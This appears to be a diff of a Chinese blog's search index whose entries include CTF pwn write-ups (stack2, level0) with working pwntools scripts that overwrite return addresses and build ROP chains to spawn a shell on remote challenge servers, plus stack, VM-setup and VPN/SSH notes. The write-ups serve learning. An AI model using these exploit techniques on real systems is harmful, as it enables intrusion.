-<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
-<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
-<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
-<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
-<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
-<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
-<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
-<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
-<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
-<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
-<pre><code>#!/usr/bin/python
-#coding:utf-8
-
-from pwn import*
-
-
-
-
-
-
-system_addr=0x080485AF
-leave_offset=0x84
-
-
-def write_addr(addr,va):
-    io.sendline(&quot;3&quot;)
-    io.recvuntil(&quot;which number to change:\n&quot;)
-    io.sendline(str(addr))
-    io.recvuntil(&quot;new number:\n&quot;)
-    io.sendline(str(va))
-    io.recvuntil(&quot;5. exit\n&quot;)
-
-io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
-io.recvuntil(&quot;How many numbers you have:\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;Give me your numbers\n&quot;)
-io.sendline(&quot;1&quot;)
-io.recvuntil(&quot;5. exit\n&quot;)
-
-
-# write  system_addr  0x08048450
-
-write_addr(leave_offset,0X50)
-write_addr(leave_offset+1,0X84)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-# sh_addr  0x08048987
-leave_offset+=8
-print leave_offset
-write_addr(leave_offset,0x87)
-write_addr(leave_offset+1,0X89)
-write_addr(leave_offset+2,0X04)
-write_addr(leave_offset+3,0X08)
-
-io.sendline(&quot;5&quot;)
-io.interactive()    </code></pre>]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shell</title>
     <url>/2019/10/09/shell/</url>
     <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
@@ -572,25 +443,63 @@ shell管理你与操作系统之间的交互：
       </tags>
   </entry>
   <entry>
-    <title>stack</title>
-    <url>/2019/09/27/stack_explain/</url>
+    <title>level0</title>
+    <url>/2019/08/08/level0/</url>
     <content><![CDATA[<a id="more"></a>
 
-
-<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
-<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
-<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
-<pre><code>push   ebp       压栈 esp减小 存入ebp内容
-mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
-<p>一个栈帧从高地址到低地址应该是</p>
-<pre><code>函数参数
-函数返回地址
-ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
-栈内数据
-esp  </code></pre><p>待更新。。</p>
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
 ]]></content>
       <tags>
-        <tag>有关栈</tag>
+        <tag>做题题解</tag>
       </tags>
   </entry>
   <entry>
@@ -713,36 +622,94 @@ esp  </code></pre><p>待更新。。</p>
       </tags>
   </entry>
   <entry>
-    <title>vpn&amp;ssh</title>
-    <url>/2020/05/17/vpn-ssh/</url>
-    <content><![CDATA[<h1 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h1><blockquote>
-<p> <strong>虚拟私人网络</strong>（英语：<strong>V</strong>irtual <strong>P</strong>rivate <strong>N</strong>etwork，缩写：<strong>VPN</strong>）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/隧道协议" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到发送端认证、消息保密与准确性等功能</p>
-</blockquote>
-<ul>
-<li>虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">让外地员工访问到内网资源，利用VPN的解决方法就是在内网中架设一台VPN服务器</span><br><span class="line">外地员工在当地连上互联网后，通过互联网连接VPN服务器，然后通过VPN服务器进入企业内网。</span><br><span class="line"></span><br><span class="line">为了保证数据安全，VPN服务器和客户机之间的通讯数据都进行了加密处理。</span><br><span class="line">有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，</span><br><span class="line">就如同专门架设了一个专用网络一样，</span><br><span class="line"></span><br><span class="line">但实际上VPN使用的是互联网上的公用链路，因此VPN称为虚拟专用网络，</span><br><span class="line">其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。</span><br></pre></td></tr></table></figure>
+    <title>stack</title>
+    <url>/2019/09/27/stack_explain/</url>
+    <content><![CDATA[<a id="more"></a>
 
-<h2 id="大致原理"><a href="#大致原理" class="headerlink" title="大致原理"></a>大致原理</h2><ol>
-<li>就是在通信双方中间加了一个转发消息的服务器</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">举例来说，一个人想要打开Google，如果不用VPN，他的电脑就直接去连Google的网站。而开启VPN以后，如果他想打开Google，他的电脑就不再直接连接Google网站，而是去连接VPN服务器，并给VPN服务器发一条指令——“我要访问Google”。VPN服务器接到指令后，自己去访问Google，收到Google网页的内容，再把内容回传给员工，这样使用VPN的员工最终就能看到Google网站的内容了</span><br><span class="line"></span><br><span class="line">VPN还有一个重要特点：VPN用户和VPN服务器之间的通讯是加密的</span><br></pre></td></tr></table></figure>
 
-<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><ul>
-<li>SSH是一种网络协议，用于计算机之间的加密登录</li>
-</ul>
-<p>SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SSH是由客户端和服务端的软件组成的</span><br><span class="line"></span><br><span class="line">服务端是一个守护进程(daemon)，他在后台运行并响应来自客户端的连接请求。</span><br><span class="line">服务端一般是sshd进程，提供了对远程连接的处理，</span><br><span class="line">一般包括公共密钥认证、密钥交换、对称密钥加密和非安全连接</span><br><span class="line"></span><br><span class="line">客户端包含ssh程序以及像scp（远程拷贝）、slogin（远程登陆）、sftp（安全文件传输）等其他的应用程序。</span><br><span class="line"></span><br><span class="line">工作机制大致是本地的客户端发送一个连接请求到远程的服务端，服务端检查申请的包和IP地址再发送密钥给SSH的客户端，本地再将密钥发回给服务端，自此连接建立</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SSH（代表“安全shell”）不是专为转发网络流量而设计的。 一般情况下，SSH用于安全地获取和使用远程终端会话-但SSH有其他用途 。 SSH还使用强加密，您可以将SSH客户端设置为SOCKS代理。 完成后，您可以在计算机上配置应用程序（如Web浏览器）以使用SOCKS代理。 流量进入在本地系统上运行的SOCKS代理，SSH客户端通过SSH连接转发它 - 这被称为SSH隧道。 这类似于通过VPN浏览网络 - 从网络服务器的角度来看，您的流量似乎来自SSH服务器。 计算机和SSH服务器之间的流量已加密，因此您可以通过加密连接浏览，就像使用VPN一样。</span><br></pre></td></tr></table></figure>
-
+<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
+<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
+<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
+<pre><code>push   ebp       压栈 esp减小 存入ebp内容
+mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
+<p>一个栈帧从高地址到低地址应该是</p>
+<pre><code>函数参数
+函数返回地址
+ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
+栈内数据
+esp  </code></pre><p>待更新。。</p>
 ]]></content>
-      <categories>
-        <category>网络</category>
-      </categories>
       <tags>
-        <tag>vpn</tag>
-        <tag>ssh</tag>
+        <tag>有关栈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>stack2</title>
+    <url>/2019/10/11/stack2/</url>
+    <content><![CDATA[<p>1.file命令查看为32位</p>
+<p>2.checksec命令查看保护机制<br><img alt data-src="/2019/10/11/stack2/2.png" class="lazyload"></p>
+<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
+<p>3.做题首先运行一下，查看程序的运行过程</p>
+<p><img alt data-src="/2019/10/11/stack2/1.png" class="lazyload"></p>
+<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
+<p><img alt data-src="/2019/10/11/stack2/3.png" class="lazyload"></p>
+<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
+<p><img alt data-src="/2019/10/11/stack2/4.png" class="lazyload"></p>
+<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
+<p><img alt data-src="/2019/10/11/stack2/5.png" class="lazyload"></p>
+<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？<br>大家可以先思考一下。</p>
+<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
+<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
+<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
+<p><img alt data-src="/2019/10/11/stack2/6.png" class="lazyload"><br>下面是脚本</p>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
+
+from pwn import*
+
+
+
+
+
+
+system_addr=0x080485AF
+leave_offset=0x84
+
+
+def write_addr(addr,va):
+    io.sendline(&quot;3&quot;)
+    io.recvuntil(&quot;which number to change:\n&quot;)
+    io.sendline(str(addr))
+    io.recvuntil(&quot;new number:\n&quot;)
+    io.sendline(str(va))
+    io.recvuntil(&quot;5. exit\n&quot;)
+
+io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
+io.recvuntil(&quot;How many numbers you have:\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;Give me your numbers\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;5. exit\n&quot;)
+
+
+# write  system_addr  0x08048450
+
+write_addr(leave_offset,0X50)
+write_addr(leave_offset+1,0X84)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+# sh_addr  0x08048987
+leave_offset+=8
+print leave_offset
+write_addr(leave_offset,0x87)
+write_addr(leave_offset+1,0X89)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+
+io.sendline(&quot;5&quot;)
+io.interactive()    </code></pre>]]></content>
+      <tags>
+        <tag>做题题解</tag>
       </tags>
   </entry>
   <entry>
@@ -788,6 +755,107 @@ sudo gedit pip.conf
       </tags>
   </entry>
   <entry>
+    <title>虚拟机配置</title>
+    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<h2 id="1-安装镜像后，安装VMtools"><a href="#1-安装镜像后，安装VMtools" class="headerlink" title="1.安装镜像后，安装VMtools"></a>1.安装镜像后，安装VMtools</h2><p>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
+<p>如果提示 的是 路径， 则直接回车就好。</p>
+<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
+<h2 id="2-更换软件源"><a href="#2-更换软件源" class="headerlink" title="2.更换软件源"></a>2.更换软件源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>
+
+<p>推荐：    <a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a><br>    <a href="https://blog.csdn.net/baidu_36602427/article/details/86551862" target="_blank" rel="noopener">https://blog.csdn.net/baidu_36602427/article/details/86551862</a>  //源比较多<br>    <a href="https://www.cnblogs.com/flyinggod/p/7979108.html" target="_blank" rel="noopener">https://www.cnblogs.com/flyinggod/p/7979108.html</a><br>不推荐：<a href="https://blog.csdn.net/xkwy100/article/details/80301156" target="_blank" rel="noopener">https://blog.csdn.net/xkwy100/article/details/80301156</a></p>
+<p>解决问题E: Could not get lock /var/lib/apt/lists/lock<br><a href="https://www.cnblogs.com/qq952693358/p/6537846.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq952693358/p/6537846.html</a></p>
+<p>/etc/apt/sources.list</p>
+<p>默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">预发布软件源，不建议启用</span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+
+<p>sudo apt-get update</p>
+<h2 id="3-安装pip"><a href="#3-安装pip" class="headerlink" title="3.安装pip"></a>3.安装pip</h2><p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<pre><code>安装：  sudo apt install python-pip
+
+遇到问题，    
+        Unable to locate package python-pip
+解决方法： 更新软件源
+        sudo apt-get update</code></pre><p><a href="https://www.jianshu.com/p/568aab038d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/568aab038d4c</a><br><a href="https://blog.csdn.net/qq_35759574/article/details/82842637" target="_blank" rel="noopener">https://blog.csdn.net/qq_35759574/article/details/82842637</a></p>
+<h2 id="4-更改pip源"><a href="#4-更改pip源" class="headerlink" title="4.更改pip源"></a>4.更改pip源</h2><p>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a><br><a href="https://www.jianshu.com/p/364146ade9be" target="_blank" rel="noopener">https://www.jianshu.com/p/364146ade9be</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-安装pwntools"><a href="#5-安装pwntools" class="headerlink" title="5.安装pwntools"></a>5.安装pwntools</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo apt-get install python-pip python-dev build-essential</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
+<h2 id="6-安装pwndbg"><a href="#6-安装pwndbg" class="headerlink" title="6.安装pwndbg"></a>6.安装pwndbg</h2><p><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+<p>####pwn相关工具的安装全解<br><a href="https://blog.csdn.net/sea_time/article/details/103131548" target="_blank" rel="noopener">https://blog.csdn.net/sea_time/article/details/103131548</a></p>
+<p>###解决git clone更新慢<br><a href="https://blog.csdn.net/hzwwpgmwy/article/details/79043251" target="_blank" rel="noopener">https://blog.csdn.net/hzwwpgmwy/article/details/79043251</a></p>
+<h2 id="7-sublime下载"><a href="#7-sublime下载" class="headerlink" title="7.sublime下载"></a>7.sublime下载</h2><p><a href="https://blog.csdn.net/qq_34894670/article/details/83832881" target="_blank" rel="noopener">https://blog.csdn.net/qq_34894670/article/details/83832881</a></p>
+<p><a href="https://blog.csdn.net/comway_Li/article/details/85050143" target="_blank" rel="noopener">https://blog.csdn.net/comway_Li/article/details/85050143</a></p>
+<p><a href="https://blog.csdn.net/ajianyingxiaoqinghan/article/details/78910182" target="_blank" rel="noopener">https://blog.csdn.net/ajianyingxiaoqinghan/article/details/78910182</a></p>
+<h2 id="8-docker搭建"><a href="#8-docker搭建" class="headerlink" title="8.docker搭建"></a>8.docker搭建</h2><p><a href="https://blog.csdn.net/White_Idiot/article/details/88950000" target="_blank" rel="noopener">https://blog.csdn.net/White_Idiot/article/details/88950000</a>      可以用<br><a href="https://www.cnblogs.com/blog-rui/p/9946382.html" target="_blank" rel="noopener">https://www.cnblogs.com/blog-rui/p/9946382.html</a></p>
+<p> 好像不能用了，  <a href="https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/</a>           景学长博客<br><a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a></p>
+<p>###出现lock问题<br><a href="https://blog.csdn.net/spurmoon/article/details/86618261" target="_blank" rel="noopener">https://blog.csdn.net/spurmoon/article/details/86618261</a></p>
+<h2 id="9-时间同步"><a href="#9-时间同步" class="headerlink" title="9.时间同步"></a>9.时间同步</h2><p><a href="https://linux.cn/article-11220-1-rel.html" target="_blank" rel="noopener">https://linux.cn/article-11220-1-rel.html</a><br>cat /etc/timezone    //时区信息</p>
+<p> sudo timedatectl set-timezone Asia/Shanghai    设为上海时区</p>
+<p>date查看时间与时区</p>
+<h2 id="10-sublime"><a href="#10-sublime" class="headerlink" title="10.sublime"></a>10.sublime</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/sublime-text-3</span><br><span class="line">sudo apt-get update   </span><br><span class="line">sudo apt-get install sublime-text</span><br></pre></td></tr></table></figure>
+
+<h2 id="11-google拼音"><a href="#11-google拼音" class="headerlink" title="11.google拼音"></a>11.google拼音</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">安装汉语语言包</span><br><span class="line">sudo apt install language-pack-zh-hans</span><br><span class="line"></span><br><span class="line">安装谷歌拼音输入法</span><br><span class="line">sudo apt install fcitx-googlepinyi</span><br><span class="line"></span><br><span class="line">打开 SystemSettings  -&gt; Language Support</span><br><span class="line"> 选择“keyboard input method system&quot;(键盘输入方式系统)为：fcitx</span><br></pre></td></tr></table></figure>
+
+<p>在搜索栏点击搜索打开 fcitx configuration<br>Input Method<br>取消Only show current language<br>点击 “+” 增加 Google Pinyin<br>可通过 “^” 调整输入法默认顺序<br>Globlal Config? -&gt; Trigger Config 为切换输入法快捷键</p>
+<h2 id="12-美化"><a href="#12-美化" class="headerlink" title="12.美化"></a>12.美化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:noobslab/themes</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install flatabulous-theme</span><br></pre></td></tr></table></figure>
+
+<p>安装numix图标：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-add-repository ppa:numix/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install numix-icon-theme-circle</span><br></pre></td></tr></table></figure>
+
+<p>安装Unity管理工具，这是一个神器，可以用来设置主题、图标等等：</p>
+<p>sudo apt-get install unity-tweak-tool<br>把Ubuntu的启动器位置改为和Windows一样在桌面底部显示：</p>
+<p>gsettings set com.canonical.Unity.Launcher launcher-position Bottom<br>如果要还原成默认的可以执行：</p>
+<p>gsettings set com.canonical.Unity.Launcher launcher-position Left</p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>链接</title>
+    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>vpn&amp;ssh</title>
+    <url>/2020/05/17/vpn-ssh/</url>
+    <content><![CDATA[<h1 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h1><blockquote>
+<p> <strong>虚拟私人网络</strong>（英语：<strong>V</strong>irtual <strong>P</strong>rivate <strong>N</strong>etwork，缩写：<strong>VPN</strong>）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/隧道协议" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到发送端认证、消息保密与准确性等功能</p>
+</blockquote>
+<ul>
+<li>虚拟专用网络(VPN)的功能是：在公用网络上建立专用网络，进行加密通讯</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">让外地员工访问到内网资源，利用VPN的解决方法就是在内网中架设一台VPN服务器</span><br><span class="line">外地员工在当地连上互联网后，通过互联网连接VPN服务器，然后通过VPN服务器进入企业内网。</span><br><span class="line"></span><br><span class="line">为了保证数据安全，VPN服务器和客户机之间的通讯数据都进行了加密处理。</span><br><span class="line">有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，</span><br><span class="line">就如同专门架设了一个专用网络一样，</span><br><span class="line"></span><br><span class="line">但实际上VPN使用的是互联网上的公用链路，因此VPN称为虚拟专用网络，</span><br><span class="line">其实质上就是利用加密技术在公网上封装出一个数据通讯隧道。</span><br></pre></td></tr></table></figure>
+
+<h2 id="大致原理"><a href="#大致原理" class="headerlink" title="大致原理"></a>大致原理</h2><ol>
+<li>就是在通信双方中间加了一个转发消息的服务器</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">举例来说，一个人想要打开Google，如果不用VPN，他的电脑就直接去连Google的网站。而开启VPN以后，如果他想打开Google，他的电脑就不再直接连接Google网站，而是去连接VPN服务器，并给VPN服务器发一条指令——“我要访问Google”。VPN服务器接到指令后，自己去访问Google，收到Google网页的内容，再把内容回传给员工，这样使用VPN的员工最终就能看到Google网站的内容了</span><br><span class="line"></span><br><span class="line">VPN还有一个重要特点：VPN用户和VPN服务器之间的通讯是加密的</span><br></pre></td></tr></table></figure>
+
+<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><ul>
+<li>SSH是一种网络协议，用于计算机之间的加密登录</li>
+</ul>
+<p>SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SSH是由客户端和服务端的软件组成的</span><br><span class="line"></span><br><span class="line">服务端是一个守护进程(daemon)，他在后台运行并响应来自客户端的连接请求。</span><br><span class="line">服务端一般是sshd进程，提供了对远程连接的处理，</span><br><span class="line">一般包括公共密钥认证、密钥交换、对称密钥加密和非安全连接</span><br><span class="line"></span><br><span class="line">客户端包含ssh程序以及像scp（远程拷贝）、slogin（远程登陆）、sftp（安全文件传输）等其他的应用程序。</span><br><span class="line"></span><br><span class="line">工作机制大致是本地的客户端发送一个连接请求到远程的服务端，服务端检查申请的包和IP地址再发送密钥给SSH的客户端，本地再将密钥发回给服务端，自此连接建立</span><br></pre></td></tr></table></figure>
+
